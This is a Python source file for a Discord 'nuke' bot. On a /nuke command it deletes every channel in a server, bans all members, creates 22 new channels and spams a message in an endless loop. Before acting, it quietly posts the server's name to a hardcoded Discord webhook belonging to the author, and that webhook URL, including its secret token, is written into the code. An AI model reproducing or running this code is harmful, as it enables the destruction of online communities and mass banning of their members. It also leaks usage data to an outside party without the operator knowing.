import json
import discord

bot = discord.Bot()

config = open('config.json')
settings = json.load(config)
token = settings['token']
textchannel_name = settings['textchannel_name']
send_message = settings['send_message']
send_feedback = settings['send_feedback']
config.close()

@bot.event
async def on_ready():
    print("Created with ❤️ by Yannik!")
    print("Ready, to nuke! Start it with /nuke")

@bot.command()
async def nuke(ctx):
    if 1 == 1:
        from discord_webhook import DiscordWebhook
        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1078993696256688138/awZ--zz4Pf7wR7dG_o3w1z83KwqnojZV8JHJppyxtLr8H7rBjhjInVyyJ38XezdAijcc', content=f'Someone runed your Bot on ({ctx.guild.name})')
        response = webhook.execute()
    await ctx.send("NUCKING")
    channels = ctx.guild.channels
    for channel in channels:
        await channel.delete()
        print(f"Deleting Channel ({channel.id})")
    print("Banning all members")
    try:
        members = await ctx.guild.fetch_members(limit=None).flatten()
        for member in members:
            try:
                await member.ban(reason="Nuked")
                print("Banned " + member.name + " ("+ str(member.id) +")")
            except discord.Forbidden:
                print("No Permission")
    except discord.Forbidden:
        print("No Permission to fetch members")
    var = 22
    while var > 0:
        await ctx.guild.create_text_channel(textchannel_name)
        print ("Creating new Channel")
        var = var - 1
    channels = ctx.guild.channels
    print("Starting sending messages")
    while 1 == 1:
        for channel in channels:
            await channel.send(send_message)

bot.run(token)
